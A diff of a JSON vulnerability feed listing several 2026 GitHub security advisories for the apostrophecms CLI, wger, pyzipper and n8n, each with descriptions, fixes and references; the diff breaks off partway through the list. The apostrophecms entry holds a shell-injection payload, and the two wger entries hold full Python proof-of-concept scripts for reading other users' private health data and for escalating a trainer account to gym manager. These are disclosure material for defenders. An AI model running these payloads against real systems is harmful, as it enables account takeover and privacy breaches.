@@ -1,31 +1,842 @@
 {
-  "candidate_count": 1,
+  "candidate_count": 29,
   "candidates": [
     {
-      "canonical_id": "CVE-2026-20182",
-      "composite_confidence": 0.99,
-      "cwe": [],
-      "description": "Cisco Catalyst SD-WAN Controller & Manager contain an authentication bypass vulnerability that allows an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges on an affected system.",
-      "first_seen": "2026-05-14T17:17:09.541239+00:00",
+      "canonical_id": "CVE-2026-42853",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-78"
+      ],
+      "description": "Summary\n\nThe @apostrophecms/cli package contains a command injection vulnerability in the apos create command.\nUser-supplied input from the password prompt is embedded directly into a shell command without proper sanitization or escaping.\nThis allows execution of arbitrary commands on the host system.\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nDetails\n\nVulnerable file: lib/commands/create.js\nLocation: Line 186\n\nThe CLI collects a password using an interactive prompt and passes it directly into a shell command.\n\nVulnerable code:\n\nconst response = await prompts({\ntype: 'password',\nname: 'pw',\nmessage: '\ud83d\udd0f Please enter a password:'\n});\n\nexec(echo \"${response.pw}\" | ${createUserCommand});\n\nThe value of response.pw is not validated, sanitized, or escaped before being used in exec().\n\nThis allows shell metacharacters such as ;, &&, and $() to break out of the intended command and execute arbitrary commands.\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nSteps to Reproduce\n\n1) Install the CLI\n      npm install -g @apostrophecms/cli\n2) Create a new project\n      mkdir testproject && cd testproject\n      apos create mysite\n3)When prompted for the admin password, enter\n      \"; id > /tmp/apos_rce_proof.txt; echo \"\n4)Verify command execution\n        cat /tmp/apos_rce_proof.txt\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nProof of Concept Output\n\nuid=1000(vboxuser) gid=1000(vboxuser) groups=1000(vboxuser),27(sudo),984(docker)\n\nThis confirms arbitrary command execution with the privileges of the user running the CLI.\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nImpact\n\nArbitrary command execution on the developer\u2019s machine\nExecution occurs with the privileges of the user running the CLI\n\nThis can lead to:\n\nFile modification or deletion\nCredential exposure\nSystem compromise depending on user privileges\n\nAn attacker can exploit this by influencing the password input (for example, through social engineering, malicious documentation, or compromised automation scripts).\n\nThe proof-of-concept shows execution under a user belonging to privileged groups such as sudo and docker, which may allow further privilege escalation depending on system configuration.\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nSuggested Fix\n\nAvoid using exec() with user-controlled input.\n\nUse execFile() instead:\n\nconst { execFileSync } = require('child_process');\n\nexecFileSync('node', [appJsPath, userTask, 'admin', 'admin'], {\ninput: response.pw + '\\n'\n});\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nAffected Version\n\nAll current versions of @apostrophecms/cli\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nTested On\n\nUbuntu 22.04\nNode.js v18.19.1\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nCWE\n\nCWE-78 \u2014 Improper Neutralization of Special Elements used in an OS Command\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+      "first_seen": "2026-05-14T18:04:02.410846+00:00",
       "frameworks": [
-        "Catalyst SD-WAN",
-        "Cisco"
+        "npm"
       ],
       "key_kind": "cve",
       "languages": [],
-      "last_seen": "2026-05-14T17:17:09.541239+00:00",
+      "last_seen": "2026-05-14T18:04:02.410846+00:00",
       "merged_sources": [
-        "kev"
+        "ghsa"
       ],
       "proactive_only": false,
       "raw_records_count": 1,
       "references": [
-        "CISA Mitigation Instructions: https://www.cisa.gov/news-events/directives/ed-26-03-mitigate-vulnerabilities-cisco-sd-wan-systems ; https://www.cisa.gov/news-events/directives/supplemental-direction-ed-26-03-hunt-and-hardening-guidance-cisco-sd-wan-systems ; https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW ; https://nvd.nist.gov/vuln/detail/CVE-2026-20182"
+        "https://github.com/advisories/GHSA-hcwq-x9fw-8cfq",
+        "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-hcwq-x9fw-8cfq"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "@apostrophecms/cli: Command Injection in apos create via Unsanitized Password Input"
+    },
+    {
+      "canonical_id": "CVE-2026-43977",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-200",
+        "CWE-284"
+      ],
+      "description": "### Summary \nAny authenticated user can read another user's private workout session notes, exercise history, and training statistics by calling the /logs/ and /stats/ actions on a routine they do not own.\n\nThe RoutinePermission class grants read access to any authenticated user when a routine has is_template=True, regardless of ownership. The /logs/ and /stats/ API actions use the same permission check but return the routine owner's personal training data instead of the requesting user's data, creating an insecure direct object reference (IDOR).\n\nAn attacker with a free account can enumerate all public template routine IDs via GET /api/v2/routine/?is_template=true, then call \nGET /api/v2/routine/{id}/logs/ and GET /api/v2/routine/{id}/stats/ to access the owner's private health data including workout notes, weights, repetitions, and performance statistics.\n\n### Description\n\nwger exposes a REST API endpoint that allows any authenticated user to retrieve the **private workout session notes, exercise logs, and training statistics** belonging to another user, as long as that user has at least one routine marked as a public template.\n\nThe vulnerability exists in `RoutineViewSet` (`wger/manager/api/views.py`). The view defines two custom actions  `/logs/` and `/stats/`  that are intended to return data for the **requesting user's own** training history within a routine. However, the underlying permission check (`RoutinePermission.has_object_permission`) grants read access to **any** authenticated user when the routine has `is_template=True`, regardless of ownership. When the `/logs/` or `/stats/` actions are invoked against a routine the attacker does not own, they return the **owner's** private workout history, not the attacker's.\n\n### Root Cause\n\n**File:** `wger/manager/api/permissions.py`, lines 30\u201341\n\n```python\ndef has_object_permission(self, request, view, obj):\n    if obj.user == request.user:\n        return True\n\n    if obj.is_template:                                  # \u2190 any template is readable\n        return request.method in permissions.SAFE_METHODS  # by any authenticated user\n\n    return False\n```\n\n**File:** `wger/manager/api/views.py`, lines 173\u2013199\n\n```python\n@action(detail=True, url_path='logs')\ndef logs(self, request, pk):\n    out = LogDisplaySerializer(\n        self.get_object().logs_display(),   # \u2190 returns OWNER's logs, not request.user's\n        many=True,\n    ).data\n    return Response(out)\n\n@action(detail=True, url_path='stats')\ndef stats(self, request, pk):\n    out = LogStatsDataSerializer(\n        self.get_object().calculate_log_statistics()  # \u2190 owner's statistics\n    ).data\n    return Response(out)\n```\n\n`self.get_object()` retrieves the routine belonging to the **owner** (e.g., user A). Since `is_template=True` passes the permission check for any authenticated user, the attacker's request reaches `logs_display()` and `calculate_log_statistics()`, which return the **owner's** workout history, not the attacker's.\n\nThe intended behavior is that templates are public workout *plans* (exercise structure, sets, reps), but the `/logs/` and `/stats/` actions expose the *owner's personal training history* logged against that plan.\n\n\n### Impact\n\nAn authenticated attacker can:\n\n1. **Enumerate** all public template routines across all users:\n   `GET /api/v2/routine/?is_template=true&is_public=true`\n\n2. **Read private workout session notes** (freeform text entered by the victim after each workout session)\n\n3. **Read full workout history** including exercise names, weights, repetitions, and dates\n\n4. **Read training statistics** including volume, intensity, and set counts per muscle group and mesocycle\n\nThis data is health-related and personal. Under GDPR and similar regulations, unauthorized access to personal health data constitutes a data breach.\n\n\n### Proof of Concept\n\n#### Scenario\n\nThere are two users in the system:\n\n- **alice** : a regular wger user who has been using the platform for months. She created a routine called \"My 5/3/1 Program\" and marked it as a public template so others can copy her exercise structure. She logs all her workouts with personal notes after each session.\n\n- **bob** :  a second registered user who has never interacted with alice's account.\n\n**The attack:**\n\nBob calls the routine listing endpoint to find all public templates. He gets back alice's routine ID. He then calls `/api/v2/routine/{id}/logs/`  an endpoint that should only show his own logs but instead receives alice's full workout history, including all her session notes (\"Felt strong today, PR on squat\"), weights, and performance data.\n\nBob does **not** need to know alice's username. He only needs her routine ID, which is a sequential integer discoverable by iterating `?is_template=true`.\n\n#### Step-by-step\n\n1. Bob registers a free account on the wger instance and obtains a JWT access token via `POST /api/v2/token`.\n\n2. Bob calls `GET /api/v2/routine/?is_template=true&is_public=true` this lists all public template routines from **all users** across the platform, including their IDs.\n\n3. For each routine ID returned, Bob calls `GET /api/v2/routine/{id}/logs/`  this returns the **routine owner's** workout sessions, including freeform personal notes and all logged exercises with weights and reps.\n\n4. Bob calls `GET /api/v2/routine/{id}/stats/` to get aggregated statistics (total volume, intensity by muscle group, weekly progression) for the routine's owner.\n\nNo special permissions are needed. A fresh account (1-minute-old) can exploit this.\n\n#### Python PoC\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: IDOR - Workout Session Data Exposure via Template Routine API\nAffected: wger <= 2.5.0a2\nTarget:   GET /api/v2/routine/{id}/logs/\n          GET /api/v2/routine/{id}/stats/\n\"\"\"\n\nimport requests\nimport json\n\nBASE_URL = \"http://TARGET_IP\"  # replace with target\n\n\ndef get_token(username, password):\n    r = requests.post(\n        f\"{BASE_URL}/api/v2/token\",\n        json={\"username\": username, \"password\": password},\n    )\n    r.raise_for_status()\n    return r.json()[\"access\"]\n\n\ndef exploit(attacker_token):\n    headers = {\"Authorization\": f\"Bearer {attacker_token}\"}\n\n    # Step 1: Enumerate all public template routines (from ALL users)\n    print(\"[*] Step 1: Enumerating public template routines...\")\n    r = requests.get(\n        f\"{BASE_URL}/api/v2/routine/\",\n        params={\"is_template\": \"true\", \"is_public\": \"true\"},\n        headers=headers,\n    )\n    routines = r.json().get(\"results\", [])\n    print(f\"[+] Found {len(routines)} public template routine(s)\\n\")\n\n    for routine in routines:\n        routine_id = routine[\"id\"]\n        routine_name = routine[\"name\"]\n        print(f\"[*] Targeting routine #{routine_id}: '{routine_name}'\")\n\n        # Step 2: Fetch the OWNER's workout session logs (IDOR)\n        logs_r = requests.get(\n            f\"{BASE_URL}/api/v2/routine/{routine_id}/logs/\",\n            headers=headers,\n        )\n\n        if logs_r.status_code == 200:\n            sessions = logs_r.json()\n            print(f\"[+] VULNERABLE! Got {len(sessions)} session(s):\")\n            for session in sessions:\n                s = session.get(\"session\", {})\n                print(f\"    Date:       {s.get('date')}\")\n                print(f\"    Notes:      {s.get('notes')}\")   # \u2190 private user notes\n                print(f\"    Impression: {s.get('impression')}\")\n                print(f\"    Logs:       {len(session.get('logs', []))} exercise entries\")\n                print()\n\n        # Step 3: Fetch the OWNER's training statistics (IDOR)\n        stats_r = requests.get(\n            f\"{BASE_URL}/api/v2/routine/{routine_id}/stats/\",\n            headers=headers,\n        )\n\n        if stats_r.status_code == 200:\n            stats = stats_r.json()\n            print(f\"[+] Training statistics for routine #{routine_id}:\")\n            volume = stats.get(\"volume\", {}).get(\"mesocycle\", {})\n            print(f\"    Total volume:      {volume.get('total')} kg\")\n            print(f\"    Upper body volume: {volume.get('upper_body')} kg\")\n            print(f\"    Lower body volume: {volume.get('lower_body')} kg\")\n            print()\n\n        print(\"-\" * 60)\n\n\nif __name__ == \"__main__\":\n    # Attacker uses their OWN credentials (no privilege needed)\n    print(\"[*] Authenticating as attacker (bob)...\")\n    token = get_token(\"bob\", \"bobpassword\")\n    print(f\"[+] Token acquired\\n\")\n\n    exploit(token)\n```\n\n#### Expected output\n\n```\n[*] Authenticating as attacker (bob)...\n[+] Token acquired\n\n[*] Step 1: Enumerating public template routines...\n[+] Found 1 public template routine(s)\n\n[*] Targeting routine #1: 'Admin Secret Routine'\n[+] VULNERABLE! Got 1 session(s):\n    Date:       2024-06-15\n    Notes:      SECRET workout note      \u2190 alice's private note\n    Impression: 3\n    Logs:       0 exercise entries\n\n[+] Training statistics for routine #1:\n    Total volume:      0.00 kg\n    Upper body volume: 0.00 kg\n    Lower body volume: 0.00 kg\n```\n\n<img width=\"671\" height=\"594\" alt=\"image\" src=\"https://github.com/user-attachments/assets/473cfd87-a63a-452d-a4f3-1aad23c4be24\" />\n\n\n### Recommended Fix\n\nThe `/logs/` and `/stats/` actions must filter results to the **requesting user**, not the routine owner.\n\n```python\n# wger/manager/api/views.py\n\n@action(detail=True, url_path='logs')\ndef logs(self, request, pk):\n    routine = self.get_object()\n    # Only return logs for the requesting user, regardless of routine ownership\n    out = LogDisplaySerializer(\n        routine.logs_display(user=request.user),\n        many=True,\n    ).data\n    return Response(out)\n\n@action(detail=True, url_path='stats')\ndef stats(self, request, pk):\n    routine = self.get_object()\n    out = LogStatsDataSerializer(\n        routine.calculate_log_statistics(user=request.user)\n    ).data\n    return Response(out)\n```\n\nAdditionally, `RoutinePermission.has_object_permission` should explicitly deny access to the `/logs/` and `/stats/` actions for non-owners, regardless of `is_template`:\n\n```python\ndef has_object_permission(self, request, view, obj):\n    if obj.user == request.user:\n        return True\n\n    # Template routines are readable, but only their structure \n    # never their owner's personal training history\n    if obj.is_template and view.action not in ('logs', 'stats'):\n        return request.method in permissions.SAFE_METHODS\n\n    return False\n```",
+      "first_seen": "2026-05-14T18:04:02.410816+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410816+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-cj9g-27ph-4cgv",
+        "https://github.com/wger-project/wger/security/advisories/GHSA-cj9g-27ph-4cgv"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "wger Vulnerable to IDOR: Authenticated Users Can Read Any User's Private Workout Session Data via Template Routine API"
+    },
+    {
+      "canonical_id": "CVE-2026-43978",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-269"
+      ],
+      "description": "### Summary\nA gym trainer can escalate their session to any higher-privileged account (gym manager, general manager) by chaining two calls to the trainer-login endpoint. Once a trainer performs a legitimate switch into a low-privileged user, the session flag `trainer.identity`\nis set and this flag alone bypasses the permission check on all subsequent trainer-login calls, allowing the trainer to hop into any account including gym managers.\n\n### Details\nIn `wger/core/views/user.py` lines 169\u2013178, the permission check uses an AND condition:\n\n```python\n# Line 169 \u2014 passes if EITHER condition is false\nif not request.user.has_perm('gym.gym_trainer') and not request.session.get('trainer.identity'):\n    return HttpResponseForbidden()\n\n# Line 173 \u2014 only runs when current user IS a trainer, not when identity is inherited\nif request.user.has_perm('gym.gym_trainer') and (\n    user.has_perm('gym.manage_gym') or user.has_perm('gym.manage_gyms')\n):\n    return HttpResponseForbidden()\n```\n\nAfter hop 1 (trainer \u2192 regular user), `request.user` is the regular user who has no `gym_trainer` permission, but `session['trainer.identity']` is set. Line 169 evaluates:\n`not False AND not False` \u2192 the second operand short-circuits the check. Line 173 is never reached because the current user is no longer a trainer. The attacker can therefore call trainer-login again targeting a manager account and it succeeds.\n\n\n### PoC\nRequirements: A running wger instance with at least one gym trainer account and one gym manager account in the same gym.\n\n```python\nimport requests\n\nBASE = 'http://localhost:80'\ns = requests.Session()\n\ndef whoami():\n    r = s.get(f'{BASE}/api/v2/userprofile/',\n              headers={'Accept': 'application/json'})\n    return r.json().get('username')\n\n# \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nprint(\"=\" * 55)\nprint(\"  PoC: Trainer Login Privilege Escalation\")\nprint(\"  wger/core/views/user.py:169\")\nprint(\"=\" * 55)\n\n# \u2500\u2500\u2500 STEP 1: Normal login as gym trainer \u2500\u2500\u2500\u2500\u2500\nprint(\"\\n[STEP 1] Login as 'trainer1'\")\nprint(\"         trainer1 has ONLY 'gym.gym_trainer' permission\")\n\ns.get(f'{BASE}/en/user/login')\ns.post(f'{BASE}/en/user/login', data={\n    'username': 'trainer1',\n    'password': 'pass1234',\n    'csrfmiddlewaretoken': s.cookies['csrftoken'],\n})\nprint(f\"         Current user  : {whoami()}\")\nprint(f\"         Permission    : gym.gym_trainer (NOT manage_gym)\")\n\n# \u2500\u2500\u2500 STEP 2: Legitimate trainer-login \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nprint(\"\\n[STEP 2] trainer1 uses trainer-login to switch into 'regular1' (pk=4)\")\nprint(\"         This is ALLOWED \u2014 trainer1 has gym_trainer permission\")\nprint(\"         Side effect: session['trainer.identity'] = trainer1_pk\")\n\ns.get(f'{BASE}/en/user/4/trainer-login')\nprint(f\"         Current user  : {whoami()}\")\nprint(f\"         Session flag  : trainer.identity is now SET\")\n\n# \u2500\u2500\u2500 STEP 3: EXPLOIT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nprint(\"\\n[STEP 3] EXPLOIT \u2014 now as 'regular1', call trainer-login for 'manager1' (pk=3)\")\nprint(\"         regular1 has ZERO permissions\")\nprint(\"         BUT session['trainer.identity'] is set from Step 2\")\nprint(\"         Line 169 check: `not has_perm() AND not session.get()` \u2192 BYPASSED\")\n\ns.get(f'{BASE}/en/user/3/trainer-login')\nresult = whoami()\nprint(f\"         Current user  : {result}\")\n\n# \u2500\u2500\u2500 RESULT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nprint(\"\\n\" + \"=\" * 55)\nif result == 'manager1':\n    print(\"  RESULT : !! VULNERABLE !!\")\n    print(\"  trainer1 (gym_trainer) is now logged in as manager1\")\n    print(\"  manager1 has 'gym.manage_gym' \u2014 full gym admin access\")\nelse:\n    print(\"  RESULT : Not vulnerable (got: \" + result + \")\")\nprint(\"=\" * 55)\n```\n\nOutput on wger 2.5.0a2:\n\n<img width=\"728\" height=\"628\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3e8affa3-4728-480c-bb57-929f66723ea5\" />\n\n### Impact\nAny authenticated gym trainer can take over a gym manager or general gym manager account within the same gym. This grants full gym administration capabilities including viewing all member data, modifying contracts, managing gym configuration, and accessing other trainers' and managers' personal information.\n\n### How to fix\n\nThe root cause is a logical error in wger/core/views/user.py at line 169. The AND operator means that if session['trainer.identity'] is set, the entire permission check is skipped \u2014 allowing any user who has previously been switched into to perform further trainer-login hops without holding the gym.gym_trainer permission themselves. Additionally, the target-user protection block at line 173 only executes when request.user is a trainer, so it never fires during a chained hop.\n\nVulnerable code (user.py:169\u2013178):\n\n```\nif not request.user.has_perm('gym.gym_trainer') and not request.session.get('trainer.identity'):\n    return HttpResponseForbidden()\n\nif request.user.has_perm('gym.gym_trainer') and (\n    user.has_perm('gym.gym_trainer')\n    or user.has_perm('gym.manage_gym')\n    or user.has_perm('gym.manage_gyms')\n):\n    return HttpResponseForbidden()\n```\n\nSuggested fix:\n\n```\ntrainer_identity_pk = request.session.get('trainer.identity')\n\nif not request.user.has_perm('gym.gym_trainer'):\n    if not trainer_identity_pk:\n        return HttpResponseForbidden()\n    # Verify the original trainer in the session still holds the permission\n    original_trainer = get_object_or_404(User, pk=trainer_identity_pk)\n    if not original_trainer.has_perm('gym.gym_trainer'):\n        return HttpResponseForbidden()\n\n# Target-user check must apply in both direct and chained hop scenarios\nif (request.user.has_perm('gym.gym_trainer') or trainer_identity_pk) and (\n    user.has_perm('gym.gym_trainer')\n    or user.has_perm('gym.manage_gym')\n    or user.has_perm('gym.manage_gyms')\n):\n    return HttpResponseForbidden()\n```",
+      "first_seen": "2026-05-14T18:04:02.410696+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410696+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-9qpr-vc49-hqg2",
+        "https://github.com/wger-project/wger/security/advisories/GHSA-9qpr-vc49-hqg2"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "wger: Privilege escalation via trainer-login session chaining allows gym trainer to impersonate gym manager"
+    },
+    {
+      "canonical_id": "CVE-2026-44722",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-480"
+      ],
+      "description": "### Impact\nA Python operator precedence bug in pyzipper/zipfile_aes.py caused the AE-2 format to never be automatically selected during encryption, regardless of file size or compression type. As a result, all encrypted entries are written in AE-1 format unless AE-2 is explicitly forced by the caller. AE-1 stores the plaintext CRC32 checksum unencrypted in the ZIP header. During investigation of this issue, it was also found that when writing to an unseekable zip archive, the CRC32 value was always written to the datadescripter section.\n\nThe AES encryption itself is not broken. An attacker who possesses the archive can read the CRC32 from the header without decrypting anything, then brute-force candidate plaintexts by computing CRC32(candidate) and comparing against the stored value. In practice, this attack is feasible today only against small or low-entropy files, as CRC32 exhaustion across a large plaintext space is computationally prohibitive on current hardware. Files with high-entropy or large content are not practically at risk under current computing constraints. Without this bug, pyzipper would have removed the CRC32 value for any file with content of less than 20 bytes uncompressed.\n\n### Patches\nUpgrade to pyzipper 0.4.0 that changes the default behaviour of pyzipper to always use the AE-2 format and exclude the CRC32 values, unless instructed to do otherwise.\n\nIf rewriting the zip archive to remove the CRC values for small files, the entire zip archive should be recreated to avoid the original local file header with the CRC included remaining in the zip file in a detached state.\n\n## Credit\nThanks to Lucas Lavarello from Kulkan Security for identifying this issue.\n\n### References\nhttps://www.winzip.com/en/support/aes-encryption/#CRC\nhttps://www.winzip.com/en/support/aes-encryption/#crc-faq",
+      "first_seen": "2026-05-14T18:04:02.410632+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410632+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-crqm-m339-7m2p",
+        "https://github.com/danifus/pyzipper/releases/tag/v0.4.0",
+        "https://github.com/danifus/pyzipper/security/advisories/GHSA-crqm-m339-7m2p"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "pyzipper has an encryption bypass for small files encrypted using it"
+    },
+    {
+      "canonical_id": "CVE-2026-44789",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1321"
+      ],
+      "description": "## Impact\nAn authenticated user with permission to create or modify workflows could achieve global prototype pollution via an unvalidated pagination parameter in the HTTP Request node. Combined with other techniques this could lead to RCE on the instance.\n\n## Patches\nThe issue has been fixed in n8n versions 1.123.43, 2.20.7, and 2.22.1. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Disable the HTTP Request node by adding `n8n-nodes-base.httpRequest` to the `NODES_EXCLUDE` environment variable.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.\n\n---\nn8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backwards compatibility.\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "first_seen": "2026-05-14T18:04:02.410616+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410616+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-c8xv-5998-g76h",
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-c8xv-5998-g76h"
       ],
       "severity": "critical",
       "source_count": 1,
-      "title": "Cisco Catalyst SD-WAN Controller Authentication Bypass Vulnerability"
+      "title": "n8n: HTTP Request Node Pagination Prototype Pollution to RCE"
+    },
+    {
+      "canonical_id": "CVE-2026-44790",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-88"
+      ],
+      "description": "## Impact\nAn authenticated user with permission to create or modify workflows could inject CLI flags on the Git node's Push operation allowing an attacker to read arbitrary files from the n8n server potentially leading to full compromise.\n\n## Patches\nThe issue has been fixed in n8n versions 1.123.43, 2.20.7, and 2.22.1. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Disable the Git node by adding `n8n-nodes-base.git` to the `NODES_EXCLUDE` environment variable.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.\n\n---\nn8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backwards compatibility.\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "first_seen": "2026-05-14T18:04:02.410609+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410609+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-57g9-58c2-xjg3",
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-57g9-58c2-xjg3"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "n8n Has an Arbitrary File Read via Git Node"
+    },
+    {
+      "canonical_id": "CVE-2026-44791",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1321"
+      ],
+      "description": "## Impact\nAn authenticated user with permission to create or modify workflows could bypass the patch for GHSA-hqr4-h3xv-9m3r in the XML node. When combined with other nodes, this could lead to RCE on the n8n host.\n\n## Patches\nThe issue has been fixed in n8n versions 1.123.43, 2.20.7, and 2.22.1. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Disable the XML node by adding `n8n-nodes-base.xml` to the `NODES_EXCLUDE` environment variable.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.\n\n---\nn8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backwards compatibility.\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "first_seen": "2026-05-14T18:04:02.410601+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410601+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-hqr4-h3xv-9m3r",
+        "https://github.com/advisories/GHSA-wrwr-h859-xh2r",
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-wrwr-h859-xh2r"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "n8n Has an XML Node Prototype Pollution Patch Bypass"
+    },
+    {
+      "canonical_id": "CVE-2026-44792",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-89"
+      ],
+      "description": "## Impact\nAn attacker with write access to the git repository connected to an n8n Source Control configuration could commit a malicious Data Table JSON file containing a crafted column name. When an administrator performed a Source Control Pull, n8n imported the file and could lead to SQL injection on the internal PostgreSQL instance.\n\nExploitation requires all of the following conditions:\n- The n8n instance uses PostgreSQL as its database backend.\n- The Source Control feature is enabled and connected to a repository the attacker can write to.\n- An administrator triggers a Source Control Pull.\n\n## Patches\nThe issue has been fixed in n8n version 1.123.43, 2.20.7, and 2.21.1. Users should upgrade to this version or later to remediate the vulnerability.\n\n## Workarounds\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Disable the Source Control feature if it is not actively required.\n- Restrict write access to the connected git repository to fully trusted users only.\n- Avoid pulling from repositories that may have been modified by untrusted parties.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "first_seen": "2026-05-14T18:04:02.410594+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410594+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-mhrx-qhrj-673w",
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-mhrx-qhrj-673w"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "n8n Has a Source Control Pull SQL Injection"
+    },
+    {
